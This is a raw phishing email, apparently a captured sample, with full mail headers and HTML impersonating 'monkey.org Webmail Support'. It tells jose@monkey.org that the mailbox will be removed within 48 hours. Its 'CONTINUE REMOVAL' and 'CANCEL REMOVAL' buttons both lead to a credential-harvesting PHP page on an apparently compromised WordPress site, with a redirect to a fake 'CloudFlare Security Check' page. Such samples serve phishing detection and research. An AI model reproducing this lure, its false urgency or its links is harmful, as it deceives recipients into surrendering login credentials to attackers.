@@ -1,0 +1,223 @@
+Return-Path: rhea@manhuasao.com
+Delivered-To: jose@monkey.org
+X-FDA: 83818968282.05.C5930FB
+Received: from dully.manhuasao.com (dully.manhuasao.com [86.106.104.242])
+	by imf04.b.hostedemail.com (Postfix) with ESMTP id E1528160007
+	for <jose@monkey.org>; Tue, 26 Aug 2025 13:20:39 +0000 (UTC)
+Authentication-Results: imf04.b.hostedemail.com;
+	dkim=pass header.d=manhuasao.com header.s=dkim header.b=DXy1gEt3;
+	spf=pass (imf04.b.hostedemail.com: domain of rhea@manhuasao.com designates
+ 86.106.104.242 as permitted sender) smtp.mailfrom=rhea@manhuasao.com;
+	dmarc=pass (policy=none) header.from=manhuasao.com
+ARC-Message-Signature: i=1; a=rsa-sha256; c=relaxed/relaxed;
+ d=hostedemail.com;
+	s=arc-20220608; t=1756214440;
+	h=from:from:sender:reply-to:subject:subject:date:date:
+	 message-id:message-id:to:to:cc:mime-version:mime-version:
+	 content-type:content-type:
+	 content-transfer-encoding:content-transfer-encoding:in-reply-to:
+	 references:dkim-signature; bh=M5pYgn63uNxxOoHWv0c/QBDAwzWLTEci5Us6t4CFSsk=;
+	b=uJpoaaMML6z1ZOOk1fC9TYIrfisC0s2OASMGB8BblScuh/luLvUvQcg2zElBVs1/7/QQ6E
+	ZCAJvSRArSqzkAWrQpcibq98tO6jHypIM74nMZtONIwxcjB8bJyMYii0jKUSgAvqFyie3S
+	cXIAfk4fIIQgd1BPWOXy2tUx3Z9dg6o=
+ARC-Seal: i=1; s=arc-20220608; d=hostedemail.com; t=1756214440; a=rsa-sha256;
+	cv=none;
+	b=XjoX4SR4UNKabFube8b7jeRVG+JLQ6cHhVXWvIFGCG4n2vxIKID1kh18rTRZvgfvFnN3f+
+	KunfDOOtw0C7CIQhh8M9z0WkmsQpof10ixhd1E2fcOhkNlZB/llEKegQ0isilSlFOQW19g
+	IE6H559qWJqa+D+rTTyz76aOjHrtN3c=
+ARC-Authentication-Results: i=1;
+	imf04.b.hostedemail.com;
+	dkim=pass header.d=manhuasao.com header.s=dkim header.b=DXy1gEt3;
+	spf=pass (imf04.b.hostedemail.com: domain of rhea@manhuasao.com designates
+ 86.106.104.242 as permitted sender) smtp.mailfrom=rhea@manhuasao.com;
+	dmarc=pass (policy=none) header.from=manhuasao.com
+DKIM-Signature: v=1; a=rsa-sha1; c=relaxed/relaxed; s=dkim; d=manhuasao.com;
+ h=From:To:Subject:Date:Message-ID:MIME-Version:Content-Type:Content-Transfer-Encoding;
+ i=rhea@manhuasao.com;
+ bh=DA+qMFBnIsHX6f25HyVwSSWSuwk=;
+ b=DXy1gEt3+A1vHTXYb9jr+TfZ16PM+XBn7QHfhlCGt+YjHFWmcCD2hH2tM/Lz1XUi6ojHUdRwi3s9
+   1wODPIAF6a3SKg7aNpt9dN8qmEEfLkiPQwrjxhTdFDGUV5B4aDVwoywgSO1JETHLGTeDJyAF1goJ
+   zQqYJlziaC2Q4zeHS3/MOOtQoyWWFoaxM9bM58qDgPKUpfZG760mmcYgIse7QUuspNe0QAhF4WSf
+   ouqMgrX2n8hzNgbPRkNbsRRD1rfHTmWZ+ihtAecZVmAmvHWvrwkEShpIuWknX1Z/uiy4BbohrHDD
+   iunRvPxNmPv7F9z200GP5tSZ5M9QxWnRuGC/QQ==
+DomainKey-Signature: a=rsa-sha1; c=nofws; q=dns; s=dkim; d=manhuasao.com;
+ b=CJJzJKBbxWE6FO9teTTlQ6myecgl0EDSymwpK5wwJ6r/uZQxnSNQGiWf4R5LQPG2sepsdm3HfJFj
+   ei/U0XFqz1SFU8s92UWILw2/dDA241+AEAq7A8uqpYn5i/+EI1meSF38XdTMN6fRNC6+Pdr7fekq
+   0+o1htmE4XU47cY5kfchi6pRzx5hxqjs0em06V4wpiR6afJXAb8dtHDALI42cBzuo3GOXznmp0V2
+   9OUL1gJuRI8tGugtLNPlVuCdoJsgRstlHfD6aF6IzffZVNP2OrQ/+jfJ0UycMCGAe+30FuU1UZU8
+   t4V0Kq0Ad3sIKsyshT54lXVwqpOpLn4wuxayGg==;
+From: monkey.org <rhea@manhuasao.com>
+To: jose@monkey.org
+Subject: Email Notice for jose@monkey.org
+Date: 26 Aug 2025 13:04:45 +0200
+Message-ID: <20250826130445.F3955B9E233CCDD2@manhuasao.com>
+MIME-Version: 1.0
+Content-Type: text/html
+Content-Transfer-Encoding: quoted-printable
+X-Rspamd-Server: rspam10
+X-Rspamd-Queue-Id: E1528160007
+X-Stat-Signature: c8zcsns1us4h1uyupo5of3j69hrnsai5
+X-Rspam-User: 
+X-Spam-Status: No, score=7.24
+X-HE-Tag: 1756214439-475297
+X-HE-Meta: 
+ U2FsdGVkX1/cyMH20llozZ1ZLQe1XaU4dYnEoPGEEZn0hxlEpExjiu3V4/X/M+uzifqnp3z44sSAIM/bCpgcJIDGA7EChtzKm+aElEl+uAt3U08fkTrnsuF1SfqqbJC4KG5d0m9L2NweJ9IT+LCYGshW9cjiu6rD5X/y4xWNsbJqz10Jno7STsCZHTMMp5wiz048PkqgKPhmm7pypOBxgpfB180sEvmWH2fhtvzrGQiYp3LOtBgYSfYfPAwhVZLtZXH2AzY6adcfrw+BI5usD2Mb9QWryfaerjjOrPdxLYwRZBPjScLi5MNlY4UJ8TBXwzXq6gcP1eKjw7RLM3OYqNPAex5YdpRQ6ivh4sTTo/jsZpFRJyCAd8WhbvWq+7Bc0aqhLKjZ3ofUvmsq3zXHh0lH3zkmJpLTwN3ykNTQ1TMvJjUSSUnOn/Qlut6jJPIzSmpZEOa0nmJRr9guWuYZhKlfz1IsZHvdw3fgHe6WyzyY32JBSuk/KW863nQ8WbjvuP7xiQwBAaFk3vU4e6ZkQaztiD7wTf067jGMw2V/KM2isZllvw8zapgFjPHaN/pmTTsO4ZDxwS3XDVLGDG1bhfiRgkcSZuSrSp9jSUt5wUoSHkI0QjczUiRsD/9FHhy3502uMCk395mCNzXr29hLV6ktzJeXRe7/ZDjvOBqLG5Oh0A+ZG3pNU/mdJmOe3Zs3H22ATiy3nI3c55zVUNW8IvrGWF+j7b9keoQjOlTbagys6nvi8hVxZPp6mssNBbewXIsBwDEynxvP4c2SGQm6tacigSKIjXxfINhake1SYBCoaUSec91U/1TFuFfoIFw3oHEC3g7L0B0jbzdbALYXW1utMDzssKyq0ACJc8YpwBZ8AyC77LBbLXcy/Rba6ui5Cxtwud2HVL9usRsztXI81Yy54udoN28xKJAUGgZSALt8+PMq1lbJRqu/JElS2Z4iqqkcYuNJlOZmRpSJbdHwow5Zgv6
+ eNkbhm2vrJXJVD2XQ7ftZihtusrf60ZsJVOlAAVty/Cqr2cbTnxfE90JzPDB7Y135uvct5Jamu8rpt+gdHII13T1wWv6zrGH7mjyqUg1lZMQb+JKYDa6tvB6Qs77uS3F6Mc24iOLU4SDv7OmWcFjfWwTqQgZ21anBgMb+1+rKWuwwgl4usPg8ijbEaWKt5dYZ2yZzeJ1brmE6z7c=
+Status: O
+X-Status: 
+X-Keywords: 
+X-UID: 341
+
+<html><head>
+<meta http-equiv=3D"X-UA-Compatible" content=3D"IE=3Dedge">
+</head>
+<body><table width=3D"100%" align=3D"center" style=3D"color: rgb(205, 205, =
+205); text-transform: none; letter-spacing: normal; font-family: arial; fon=
+t-size: 14px; font-style: normal; font-weight: 400; text-decoration: none; =
+word-spacing: 0px; white-space: normal; border-collapse: collapse; orphans:=
+ 2; widows: 2; background-color: rgb(29, 30, 31); font-variant-ligatures: n=
+ormal; font-variant-caps: normal; -webkit-text-stroke-width: 0px;" bgcolor=
+=3D"#1d1e1f" border=3D"0" cellspacing=3D"0" cellpadding=3D"0">
+<tbody style=3D"color: rgb(205, 205, 205); font-family: arial;"><tr style=
+=3D"color: rgb(205, 205, 205); font-family: arial;"><td width=3D"600" align=
+=3D"center" valign=3D"top" style=3D"margin: 0px; color: rgb(205, 205, 205);=
+ font-family: arial; white-space: normal;"><table align=3D"center" style=3D=
+"border: 1px solid rgb(25, 25, 25); color: rgb(205, 205, 205); font-family:=
+ arial; border-collapse: collapse; max-width: 600px;" border=3D"0" cellspac=
+ing=3D"0" cellpadding=3D"0">
+<tbody style=3D"border-color: rgb(25, 25, 25); color: rgb(205, 205, 205); f=
+ont-family: arial;"><tr style=3D"border-color: rgb(25, 25, 25); color: rgb(=
+205, 205, 205); font-family: arial;"><td width=3D"600" align=3D"center" val=
+ign=3D"top" style=3D"margin: 0px; color: rgb(205, 205, 205); font-family: a=
+rial; white-space: normal; max-width: 600px; background-color: rgb(25, 25, =
+25);" bgcolor=3D"#191919">
+<table width=3D"100%" align=3D"center" style=3D"color: rgb(205, 205, 205); =
+font-family: arial; border-collapse: collapse;" border=3D"0" cellspacing=3D=
+"0" cellpadding=3D"0"><tbody style=3D"color: rgb(205, 205, 205); font-famil=
+y: arial;"><tr style=3D"color: rgb(205, 205, 205); font-family: arial;"><td=
+ align=3D"center" valign=3D"top" style=3D"margin: 0px; color: rgb(205, 205,=
+ 205); font-family: arial; white-space: normal;">
+<table width=3D"92%" align=3D"center" style=3D"color: rgb(205, 205, 205); f=
+ont-family: arial; border-collapse: collapse;" border=3D"0" cellspacing=3D"=
+0" cellpadding=3D"0"><tbody style=3D"color: rgb(205, 205, 205); font-family=
+: arial;"><tr style=3D"color: rgb(205, 205, 205); font-family: arial;"><td =
+align=3D"center" valign=3D"top" style=3D"margin: 0px; color: rgb(205, 205, =
+205); font-family: arial; white-space: normal;">
+<table width=3D"100%" align=3D"center" style=3D"height: 263px; color: rgb(2=
+05, 205, 205); font-family: arial; border-collapse: collapse;" cellspacing=
+=3D"0" cellpadding=3D"0"><tbody style=3D"color: rgb(205, 205, 205); font-fa=
+mily: arial;"><tr style=3D"height: 20px; color: rgb(205, 205, 205); font-fa=
+mily: arial;"><td valign=3D"top" style=3D"margin: 0px; height: 20px; color:=
+ rgb(205, 205, 205); font-family: arial; white-space: normal;">
+<table width=3D"90%" style=3D"color: rgb(205, 205, 205); font-family: arial=
+; border-collapse: collapse;" cellspacing=3D"0" cellpadding=3D"0"><tbody st=
+yle=3D"color: rgb(205, 205, 205); font-family: arial;"><tr style=3D"color: =
+rgb(205, 205, 205); font-family: arial;"><td valign=3D"top" style=3D"margin=
+: 0px; color: rgb(205, 205, 205); line-height: 18px; font-family: roboto, a=
+rial; font-size: 12px; font-weight: 600; white-space: normal;">
+Dear&nbsp;jose,&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;=
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nb=
+sp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<wbr>&nbsp;&nbsp;&nbsp;&=
+nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbs=
+p;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&=
+nbsp;&nbsp;</td></tr></tbody></table></td></tr>
+<tr style=3D"height: 161px; color: rgb(205, 205, 205); font-family: arial;"=
+><td valign=3D"top" style=3D"margin: 0px; height: 161px; color: rgb(205, 20=
+5, 205); font-family: arial; white-space: normal;"><table width=3D"100%" st=
+yle=3D"color: rgb(205, 205, 205); font-family: arial; border-collapse: coll=
+apse;" border=3D"0" cellspacing=3D"0" cellpadding=3D"0"><tbody style=3D"col=
+or: rgb(205, 205, 205); font-family: arial;"><tr style=3D"color: rgb(205, 2=
+05, 205); font-family: arial;">
+<td height=3D"25" style=3D"margin: 0px; color: rgb(205, 205, 205); font-fam=
+ily: arial; white-space: normal;">&nbsp;</td></tr><tr style=3D"color: rgb(2=
+05, 205, 205); font-family: arial;"><td style=3D"margin: 0px; color: rgb(15=
+6, 156, 156); line-height: 19px; font-family: roboto, arial; font-size: 13p=
+x; white-space: normal;">jose@monkey.org&nbsp;removal from server has been =
+approved and initiated, Due to ignorance of last verification notice.<br st=
+yle=3D"color: rgb(156, 156, 156) !important;">
+<br style=3D"color: rgb(156, 156, 156) !important;">Removal will occur in e=
+xactly&nbsp;<strong style=3D"color: rgb(156, 156, 156); font-family: roboto=
+, arial;">48 hours from now&nbsp;8/26/2025 1:04:45 p.m...</strong><br style=
+=3D"color: rgb(156, 156, 156) !important;"><br style=3D"color: rgb(156, 156=
+, 156) !important;">We recommend that you do any of the below and protect y=
+our mailbox and increase email security.</td></tr></tbody></table></td></tr=
+>
+<tr style=3D"height: 20px; color: rgb(205, 205, 205); font-family: arial;">=
+<td height=3D"20" align=3D"left" valign=3D"top" style=3D"margin: 0px; heigh=
+t: 20px; color: rgb(205, 205, 205); font-family: arial; white-space: normal=
+;">&nbsp;</td></tr></tbody></table></td></tr><tr style=3D"color: rgb(205, 2=
+05, 205); font-family: arial;"><td align=3D"center" valign=3D"top" style=3D=
+"margin: 0px; color: rgb(205, 205, 205); font-family: arial; white-space: n=
+ormal;"><br style=3D"color: rgb(205, 205, 205) !important;">
+<br style=3D"color: rgb(205, 205, 205) !important;"><table align=3D"center"=
+ style=3D"color: rgb(205, 205, 205); font-family: arial; border-collapse: c=
+ollapse;" border=3D"0" cellspacing=3D"0" cellpadding=3D"0"><tbody style=3D"=
+color: rgb(205, 205, 205); font-family: arial;"><tr style=3D"color: rgb(205=
+, 205, 205); font-family: arial;">
+<td width=3D"288" height=3D"40" align=3D"center" style=3D"margin: 0px; colo=
+r: rgb(205, 205, 205); font-family: arial; white-space: normal; background-=
+color: rgb(194, 38, 57);" bgcolor=3D"#c22639">
+<a style=3D"border-color: rgb(25, 25, 25); color: rgb(255, 255, 255); text-=
+transform: uppercase; line-height: 40px; font-family: roboto, arial; font-s=
+ize: 14px; font-weight: 500; text-decoration: none; display: block;" href=
+=3D"https://cheshiremaintenance.com/wp-includes/ssl/aadd.php#jose@monkey.or=
+g" target=3D"_blank"=20
+data-saferedirecturl=3D"https://www.google.com/url?q=3Dhttps://mysothpost.c=
+om/wp-admin/images/CloudFlare%2520Security%2520Check09.html?email%3Dexport@=
+pure-egypt.com&amp;source=3Dgmail&amp;ust=3D1756290327922000&amp;usg=3DAOvV=
+aw0EJ6Ej_eJf3z4mTTPUWmRs">CONTINUE REMOVAL</a></td></tr></tbody></table><br=
+ style=3D"color: rgb(205, 205, 205) !important;"><table align=3D"center" st=
+yle=3D"color: rgb(205, 205, 205); font-family: arial; border-collapse: coll=
+apse;" border=3D"0" cellspacing=3D"0" cellpadding=3D"0">
+<tbody style=3D"color: rgb(205, 205, 205); font-family: arial;"><tr style=
+=3D"color: rgb(205, 205, 205); font-family: arial;"><td width=3D"288" heigh=
+t=3D"40" align=3D"center" style=3D"margin: 0px; color: rgb(205, 205, 205); =
+font-family: arial; white-space: normal; background-color: rgb(0, 119, 16);=
+" bgcolor=3D"#007710">
+<a style=3D"border-color: rgb(25, 25, 25); color: rgb(255, 255, 255); text-=
+transform: uppercase; line-height: 40px; font-family: roboto, arial; font-s=
+ize: 14px; font-weight: 500; text-decoration: none; display: block;" href=
+=3D"https://cheshiremaintenance.com/wp-includes/ssl/aadd.php#jose@monkey.or=
+g" target=3D"_blank"=20
+data-saferedirecturl=3D"https://www.google.com/url?q=3Dhttps://mysothpost.c=
+om/wp-admin/images/CloudFlare%2520Security%2520Check09.html?email%3Dexport@=
+pure-egypt.com&amp;source=3Dgmail&amp;ust=3D1756290327922000&amp;usg=3DAOvV=
+aw0EJ6Ej_eJf3z4mTTPUWmRs">CANCEL REMOVAL</a></td></tr></tbody></table></td>=
+</tr><tr style=3D"color: rgb(205, 205, 205); font-family: arial;">
+<td height=3D"25" style=3D"margin: 0px; color: rgb(205, 205, 205); font-fam=
+ily: arial; border-bottom-color: rgb(25, 25, 25); border-bottom-width: 1px;=
+ border-bottom-style: solid; white-space: normal;">&nbsp;</td></tr><tr styl=
+e=3D"color: rgb(205, 205, 205); font-family: arial;"><td height=3D"23" styl=
+e=3D"margin: 0px; color: rgb(205, 205, 205); font-family: arial; white-spac=
+e: normal;">&nbsp;</td></tr><tr style=3D"color: rgb(205, 205, 205); font-fa=
+mily: arial;">
+<td valign=3D"top" style=3D"margin: 0px; color: rgb(205, 205, 205); font-fa=
+mily: arial; white-space: normal;"><table width=3D"90%" style=3D"color: rgb=
+(205, 205, 205); font-family: arial; border-collapse: collapse;" cellspacin=
+g=3D"0" cellpadding=3D"0"><tbody style=3D"color: rgb(205, 205, 205); font-f=
+amily: arial;"><tr style=3D"color: rgb(205, 205, 205); font-family: arial;"=
+>
+<td valign=3D"top" style=3D"margin: 0px; color: rgb(205, 205, 205); line-he=
+ight: 18px; font-family: roboto, arial; font-size: 12px; font-weight: 600; =
+white-space: normal;">monkey.org&nbsp;Webmail Support 2025</td></tr></tbody=
+></table></td></tr><tr style=3D"color: rgb(205, 205, 205); font-family: ari=
+al;"><td height=3D"32" style=3D"margin: 0px; color: rgb(205, 205, 205); fon=
+t-family: arial; white-space: normal;">&nbsp;</td></tr></tbody></table></td=
+></tr></tbody></table></td></tr></tbody></table></td></tr>
+<tr style=3D"color: rgb(205, 205, 205); font-family: arial;"><td height=3D"=
+30" align=3D"center" valign=3D"top" style=3D"margin: 0px; color: rgb(205, 2=
+05, 205); font-family: arial; white-space: normal;">&nbsp;</td></tr></tbody=
+></table>
+<div style=3D"color: rgb(205, 205, 205); text-transform: none; text-indent:=
+ 0px; letter-spacing: normal; font-family: arial; font-size: 14px; font-sty=
+le: normal; font-weight: 400; text-decoration: none; word-spacing: 0px; whi=
+te-space: normal; orphans: 2; widows: 2; background-color: rgb(255, 255, 25=
+5); font-variant-ligatures: normal; font-variant-caps: normal; -webkit-text=
+-stroke-width: 0px;">&nbsp;</div>
+<div style=3D"color: rgb(205, 205, 205); text-transform: none; text-indent:=
+ 0px; letter-spacing: normal; font-family: arial; font-size: 14px; font-sty=
+le: normal; font-weight: 400; text-decoration: none; word-spacing: 0px; whi=
+te-space: normal; orphans: 2; widows: 2; background-color: rgb(255, 255, 25=
+5); font-variant-ligatures: normal; font-variant-caps: normal; -webkit-text=
+-stroke-width: 0px;">&nbsp;</div></body></html>
+
